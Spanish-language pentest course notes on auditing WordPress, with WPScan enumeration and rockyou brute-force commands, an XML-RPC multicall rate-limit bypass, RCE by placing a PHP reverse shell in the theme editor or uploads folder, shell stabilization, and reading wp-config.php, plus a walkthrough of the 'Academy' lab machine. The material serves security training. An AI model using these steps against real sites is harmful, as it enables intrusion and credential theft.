

> [!info] Relacionado con
> [[Burp Suite - Framework de Auditoría]] · [[Apuntes/05 - Auditoria Web/Enumeración Web]] · [[OWASP Top 10 - CVE CVSS CWE]] · [[Fuzzing Web con ffuf]]

---

## ① CMS vs Web nativa

| Tipo | Descripción |
|------|------------|
| **Web nativa** | Programada directamente (PHP, .NET, Java). SQLi, XSS directos. |
| **CMS** | WordPress, Joomla, Drupal. Motor + tema + plugins de terceros. |

### WordPress como motor de tres capas

```
1. WORDPRESS (motor)  → Núcleo que hace funcionar todo
2. TEMA / PLANTILLA   → Lo visual (carcasa)
3. PLUGINS            → Funcionalidades (accesorios)
```

> [!important] Idea central
> El núcleo de WordPress rara vez es vulnerable (está muy revisado). Las grandes vulnerabilidades aparecen en los **plugins**, porque hay miles y **nadie audita su seguridad**.

> [!important] Distribución asimétrica del riesgo
> - **Núcleo**: rara vez vulnerable sin autenticación previa
> - **Tema**: puede tener vulnerabilidades, pero es código visual
> - **Plugins**: comunidades **sin revisión de seguridad formal** → concentran la inmensa mayoría de vectores

### La metáfora del coche (Carlos)

> "WordPress es el motor (Lamborghini). El tema es la carcasa (Urus o Audi — mismo motor, carcasa distinta). Los plugins son los accesorios: alerón, asientos, volante. ¿En cuáles puedo tener vulnerabilidades? **En los plugins**. Y el alerón puede ser de carbono o de Aliexpress. Esas son las librerías que componen el plugin. ¿Puede tener vulnerabilidades una librería que compone una librería que compone un plugin? Sí. Pegasus era una librería Tier 3 de las llamadas de WhatsApp."

### Cadena de dependencias (cascada)

```
Plugin → Librerías → Dependencias de 2º nivel → Componentes de 3er nivel
```

Cualquier eslabón puede ser vulnerable. Conecta con **fallos en la cadena de suministro** del OWASP Top 10.

---

## ② Metodología de auditoría WordPress

```
1. netdiscover + nmap → host y puertos
2. Fuzzing web recursivo (dirsearch -r / gobuster) → /wordpress detectado
3. /etc/hosts → resolver dominio (301)
4. WPScan → versión, plugins, temas, usuarios
5. API token → CVEs asociados
6. Enumerar usuarios (mensajes de error del login)
7. Fuerza bruta con WPScan (ÚLTIMO recurso)
8. Login → Editor de temas O File Upload → RCE
9. Reverse shell → www-data → Estabilizar TTY
10. Escalada (módulo de privesc)
```

> [!important] Regla de oro
> "Siempre hay que hacer una enumeración mínima antes de explotar. Primero conocemos, después conectamos, y ya después explotamos." — Carlos Gómez

### Errores clásicos

> [!warning] Lanzar WPScan contra la raíz
> "Si tienes una web con WordPress **no significa** que toda la página sea WordPress. Puedo tener web nativa en `/` y en `/wordpress` un blog. Si lanzas WPScan contra la raíz, dice 'aquí no hay WordPress'. **Siempre lanza la herramienta contra el directorio que contiene la tecnología vulnerable**."

> [!warning] Olvidar el 301 y /etc/hosts
> `/wordpress` puede devolver **301 Moved Permanently** porque redirige al dominio real (p. ej. `academy.thehackerlabs`). Hay que mapearlo en `/etc/hosts` (Linux) o `C:\Windows\System32\drivers\etc\hosts` (Windows, como admin) para que resuelva y WPScan/navegador funcionen.

> [!warning] Fuzzing no recursivo
> Un diccionario lanzado solo sobre la raíz **no** encuentra rutas bajo `/wordpress`. Usa `-r` (Dirsearch) o enumera también la subruta. Distintas herramientas traen distintos diccionarios por defecto → distintas salidas.

> [!note] netdiscover y AWS
> netdiscover usa **ARP**, que **no** está permitido en la infraestructura de red de AWS. No sirve para descubrir hosts en entornos cloud de Amazon.

---

## ③ [[WPScan]] — La navaja suiza

```bash
# Escaneo base (detecta versión, xmlrpc, readme)
wpscan --url http://OBJETIVO/wordpress

# Enumerar usuarios con diccionario
wpscan --url http://OBJETIVO/wordpress -e u \
 -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Enumerar plugins
wpscan --url http://OBJETIVO/wordpress --enumerate ap

# Plugins vulnerables con API token (añade CVEs)
wpscan --url http://OBJETIVO/wordpress --enumerate vp --api-token TOKEN

# Fuerza bruta de contraseñas
wpscan --url http://OBJETIVO/wordpress --enumerate ap \
 --passwords /usr/share/wordlists/rockyou.txt
```

| Flag | Función |
|------|---------|
| `-e u` | Enumerar usuarios |
| `-e ap` | Todos los plugins |
| `-e vp` | Plugins vulnerables (con token) |
| `-e at` / `-e vt` | Todos los themes / themes vulnerables |
| `-e m` | Medias (uploads) |
| `--passwords` | Fuerza bruta |
| `--api-token` | Conectar con BD de vulnerabilidades |
| `--plugins-detection aggressive` | Detección agresiva de plugins |
| `--random-user-agent` / `--throttle` | Stealth (menos ruido) |
| `--proxy http://127.0.0.1:8080` | Pasar por Burp |

> [!tip] API TOKEN
> El token **no** aporta capacidades ofensivas. Solo conecta con la BD de vulnerabilidades. Se obtiene **gratis** en wpscan.com. Con él, WPScan añade los **CVEs** a cada plugin y a la versión de WordPress.

> [!warning] No toda vulnerabilidad listada es explotable
> Muchas requieren estar **autenticado** o un **rol** concreto, o afectan a una funcionalidad **no accesible**. Como aún buscas el acceso inicial, **descarta** temporalmente las que no apliquen. El trabajo del auditor es entender **en qué endpoint** aplica cada CVE.

> [!note] WPScan vs Hydra vs Intruder
> En WordPress se prefiere **WPScan**: Hydra suele no responder bien al login de WP y el Intruder de **Burp Community** está *throttled* (lento). El plugin **Wordfence** actúa como "antivirus/WAF" de WordPress y limita intentos.

### Métodos alternativos de enumeración de usuarios

```bash
# API REST
curl http://target/wp-json/wp/v2/users

# Author archive (redirige a /author/admin)
http://target/?author=1
http://target/?author=2
```

### XML-RPC y bypass de rate limiting

| Endpoint | Método |
|----------|--------|
| `xmlrpc.php` | Endpoint XML-RPC (API antigua, a menudo descartada pero presente) |
| `wp.getUsersBlogs` | Brute force |
| `system.multicall` | **Múltiples intentos en un solo request** (bypass de rate limit) |

---

## ④ Enumeración de usuarios por mensajes de error

| Mensaje | Significado |
|---------|-----------|
| "El nombre de usuario X no está registrado" | Usuario **no existe** |
| "La contraseña es incorrecta" | Usuario **sí existe** |

> [!warning] INFORMATION DISCLOSURE
> Un login bien diseñado responde siempre: "usuario o contraseña incorrectos". Cuando distingue entre ambos, **filtra información**.

---

## ⑤ RCE por editor de temas

Con acceso al panel `/wp-admin`:

1. **Apariencia → Editor de temas** (o Herramientas → Editor de archivos de tema)
2. Seleccionar plantilla **PHP** (ej: `404.php`)
3. Pegar **reverse shell PHP** (de `/usr/share/webshells/php/php-reverse-shell.php`, cambiar IP y puerto)
4. Guardar
5. Poner Netcat a la escucha
6. Visitar la página 404 en el navegador

```bash
nc -lvnp 1234
# Visitar http://OBJETIVO/wordpress/404.php
# → Conexión recibida como www-data
```

> [!warning] LA PLANTILLA DEBE SER PHP
> Si es HTML, el código PHP **no se ejecuta**. Busca un fichero `.php`.

> [!note] Servidor → lenguaje (regla general ~99,9%)
> - **Apache / Linux → PHP** (`.php`)
> - **IIS / Windows → ASP.NET** (`.aspx`)
> - Casos raros: Perl, Ruby, Go, Python, Node. Si subes la shell en el lenguaje equivocado, no se ejecuta.

### Alternativa: File Upload en panel (Bit File Manager)

Otra vía clásica en Academy: plugin **Bit File Manager** en `wp-content/uploads`:

1. Navegar a Bit File Manager → `wp-content` → `uploads`
2. Subir `php-reverse-shell.php`
3. Editar IP y puerto
4. `nc -lvnp 1234`
5. Acceder a `http://OBJETIVO/wordpress/wp-content/uploads/php-reverse-shell.php`

> [!important] El binomio mágico
> "Si encontramos un **uploader** y un **uploads** donde se almacenan las cosas y las podemos ejecutar, tenemos RCE." Binomio: poder subir + poder ejecutar = RCE.

### Webshell vs Reverse shell

| Tipo | Flujo | Firewall |
|------|-------|----------|
| **Webshell** | Tú te conectas a la máquina | Necesita que el firewall deje entrar |
| **Reverse shell** | La máquina se conecta a ti | Suele permitir salidas |

> Por lo general, **siempre reverse shell**. Si el firewall bloquea entradas pero no salidas, la reverse es la única opción.

> [!warning] WAF y forense
> Tras obtener la shell, **Wordfence (WAF) ya no protege** a nivel de aplicación: solo queda el firewall del SO. En una captura PCAP, una ráfaga HTTP que cambia a **TCP** es firma típica de reverse shell (transición HTTP → TCP).

---

## ⑥ Rutas WordPress a comprobar

| Ruta | Qué nos dice |
|------|-------------|
| `/wordpress/index.php` | Página principal (suele redirigir a home) |
| `/wordpress/license.txt` | Confirma WordPress, instalación reciente (sin limpiar) |
| `/wordpress/readme.html` | Otra señal de instalación por defecto |
| `/wp-login.php` | Login → 302 redirect a wp-login = panel de acceso → posible fuerza bruta |
| `/wp-admin/` | Panel de administración |
| `/wp-content/uploads/` | Subidas → posible file upload → vector clásico |
| `/xmlrpc.php` | API antigua (a menudo descartada, pero verificar multicall) |

---

## ⑦ Walkthrough máquina Academy (TheHackerLabs)

Kill chain completa hasta acceso inicial:

```
netdiscover -r 10.0.2.0/24
 ↓
nmap -sV -p- → 22 (SSH), 80 (HTTP Apache)
 ↓  (SSH sin credenciales → no brute force aún)
dirsearch -u http://IP/ -r -w directory-list-2.3-medium.txt
 ↓  → /wordpress (301)
/etc/hosts → IP  academy.thehackerlabs
 ↓
wpscan --url http://academy.thehackerlabs/wordpress
 ↓  → WordPress 6.5.3, xmlrpc.php, uploads
wpscan ... -e u  → usuarios
wpscan ... --enumerate ap  → plugins (p. ej. Elementor)
wpscan ... --enumerate vp --api-token TOKEN  → CVEs
 ↓
Fuerza bruta WPScan --passwords rockyou.txt → usuario (p. ej. Dylan / password1)
 ↓
Login /wp-admin → Apariencia → Editor 404.php (o Bit File Manager)
 ↓
Reverse shell PHP → nc -lvnp 1234 → www-data
 ↓
Estabilizar TTY → whoami
 ↓ (escalada a root: pendiente / módulo de privesc)
```

> [!note] Instancias distintas
> Versión, usuario, contraseña e IP varían por alumno. No copies los valores del compañero: descúbrelos en tu propia sesión. Verifica siempre el enunciado del lab.

> [!tip] Fuerza bruta es ÚLTIMO recurso
> Es ruidosa y "funciona 1 de cada 10". Antes: enumerar usuarios, reutilizar credenciales, buscar fugas. Para WP prefiere WPScan (Hydra mal con el login de WP; Intruder Community lento).

---

## ⑧ Estabilización de la shell

```bash
# En la víctima (desde la reverse shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z (suspender)
# En Kali:
stty raw -echo; fg
# Enter una o dos veces
whoami; id   # → www-data
```

### Post-explotación típico (referencia)

```bash
# wp-config.php → credenciales de BD (reutilizar en SSH si coinciden)
cat /var/www/html/wordpress/wp-config.php
# /etc/passwd → usuarios con /bin/bash
# Luego: sudo -l → GTFOBins → movimiento lateral (módulo de privesc)
```

---

## Checklist de repaso

- [ ] ¿Distingo una web nativa de un CMS y explico las 3 capas de WordPress?
- [ ] ¿Entiendo por qué el peligro está en los plugins (y en su cadena de dependencias)?
- [ ] ¿Sé que WPScan va contra `/wordpress`, no contra la raíz?
- [ ] ¿Sé resolver el 301 con /etc/hosts (Linux y Windows)?
- [ ] ¿Uso fuzzing recursivo (`dirsearch -r`) para encontrar rutas bajo /wordpress?
- [ ] ¿Sé enumerar versión, usuarios, plugins y themes con [[WPScan]]?
- [ ] ¿Conozco la diferencia entre [[WPScan]] con y sin API token?
- [ ] ¿Descarto CVEs que requieran autenticación o rol no disponible?
- [ ] ¿Reconozco la enumeración de usuarios por mensajes de error (y el bypass REST/author)?
- [ ] ¿Entiendo XML-RPC `system.multicall` como bypass de rate limit?
- [ ] ¿Sé por qué la fuerza bruta es el último recurso y por qué WPScan > Hydra/Intruder?
- [ ] ¿Consigo RCE con el editor de temas (404.php) o File Upload en uploads?
- [ ] ¿Distingo webshell de reverse shell y sé que Apache/Linux → PHP?
- [ ] ¿Entiendo la transición HTTP → TCP al obtener la shell y cómo estabilizarla?
- [ ] ¿Identifico el usuario obtenido (www-data) y qué extraer después (wp-config, /etc/passwd)?

---

## Enlaces relacionados

- [[comandos/WPScan]] — Cheat sheet de comandos









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Andres/16.06.2026 Mr. Robot Explotación Web Completa File Upload, Reverse Shell y SUID Hijacking.md|16.06.2026 Mr. Robot Explotación Web Completa File Upload, Reverse Shell y SUID Hijacking]] — FFUF, File Upload, Seguridad
- [[../../apuntes Chema/Maquinas/Auditoría de CMS - WordPress (máquina Academy).md|Auditoría de CMS - WordPress (máquina Academy)]] — FFUF, File Upload, Seguridad
- [[Repaso de Enumeración Web.md|Repaso de Enumeración Web]] — FFUF, File Upload, Seguridad
- [[Auditoria Web - Práctica con Metasploitable.md|Auditoria Web - Práctica con Metasploitable]] — FFUF, File Upload, Seguridad
- [[../../apuntes Chema/Maquinas/Explotación Avanzada de Servicios Vulnerables III.md|Explotación Avanzada de Servicios Vulnerables III]] — FFUF, Post-Explotacion, Seguridad

### 🌐 Cross-Dominio

- [[../../../programacion/Java/seguridad_java.md|seguridad_java]] — Programacion: Desarrollo Web, Linux, Seguridad
- [[../../../programacion/PHP/seguridad_php.md|seguridad_php]] — Programacion: Desarrollo Web, SQL, Seguridad

> #burpsuite #cli #command_injection #database #ffuf #file_upload #hydra #java #linux #linux_ciber #metasploit #metasploitable #netcat #pentest #post_explotacion #redes #reverse_shell #seguridad #sql #sqli #web #wordpress #wpscan #xss
